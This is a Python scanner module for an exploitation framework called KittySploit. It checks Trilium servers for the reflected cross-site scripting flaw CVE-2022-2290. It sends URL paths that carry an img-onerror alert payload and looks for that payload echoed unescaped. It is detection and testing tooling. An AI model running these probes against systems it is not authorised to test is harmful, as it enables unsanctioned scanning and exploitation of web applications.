#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Trilium prior to 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Trilium <0.52.4 - Cross-Site Scripting Detection',
        'description': 'Trilium prior to 0.52.4, 0.53.1-beta contains a cross-site scripting vulnerability which can allow an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'trilium', 'huntr', 'trilium_project', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.dev/bounties/367c5c8d-ad6f-46be-8503-06648ecf09cf/',
            'https://github.com/zadam/trilium',
            'https://github.com/zadam/trilium/commit/3faae63b849a1fabc31b823bb7af3a84d32256a7',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-2290',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-2290',
    }

    def run(self):
        for path in ('/custom/%3Cimg%20src=x%20onerror=alert(document.domain)%3E', '/share/api/notes/%3Cimg%20src=x%20onerror=alert(document.domain)%3E', '/share/api/images/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/filename'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 404:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('No handler matched for custom <img src=x onerror=alert(document.domain)>', "Note '<img src=x onerror=alert(document.domain)>' not found",)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Trilium <0.52.4 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

